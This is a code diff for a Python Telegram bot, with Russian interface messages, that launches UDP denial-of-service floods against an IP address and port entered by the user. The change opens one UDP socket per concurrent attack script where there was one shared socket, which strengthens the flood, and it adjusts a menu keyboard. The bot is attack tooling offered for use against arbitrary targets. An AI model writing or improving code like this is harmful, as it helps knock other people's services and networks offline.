@@ -1,4 +1,5 @@
 import asyncio
+import logging
 import os
 import socket
 
@@ -73,7 +74,7 @@ async def enter_ip(message: types.Message, state: FSMContext):
         async with state.proxy() as state_data:
             state_data.pop('count_script')
         await message.answer("Вы вернулись назад.\nВведиите количество одновременно работающих скриптов.",
-                             reply_markup=choose_dos_markup)
+                             reply_markup=back_menu_markup)
         await DosState.count_script.set()
     elif message.text == 'В главное меню':
         await state.reset_state()
@@ -151,7 +152,9 @@ async def enter_size(message: types.Message, state: FSMContext):
                 await message.answer("Скрипт выполняется. Для остановки нажмите на кнопку STOP.\n"
                                      "Так же был определён таймаут в 10 минут, чтобы не было большого количества запросов.",
                                      reply_markup=stop_script_markup)
-                connect = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                connects = []
+                for i in range(int(state_data['count_script'])):
+                    connects.append(socket.socket(socket.AF_INET, socket.SOCK_DGRAM))
                 ip = state_data['ip']
                 port = state_data['port']
                 size = state_data['size']
@@ -159,12 +162,13 @@ async def enter_size(message: types.Message, state: FSMContext):
                 task_get_ping = asyncio.create_task(get_ping(message, state_data))
                 task_get_timeout = asyncio.create_task(get_timeout())
                 tasks = [task_get_ping, task_get_timeout]
-                for i in range(int(state_data['count_script'])):
+                for connect in connects:
                     tasks.append(asyncio.create_task(start_dos(connect, ip, port, attack)))
                 finished, unfinished = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
                 for task in unfinished:
                     task.cancel()
-                connect.close()
+                for connect in connects:
+                    connect.close()
                 await asyncio.sleep(3)
             if await dp.current_state().get_state() == 'DosState:stop_script':
                 await message.answer("Сработал таймаут. Скрипт успешно выполнен. Возврат в главное меню.\n"
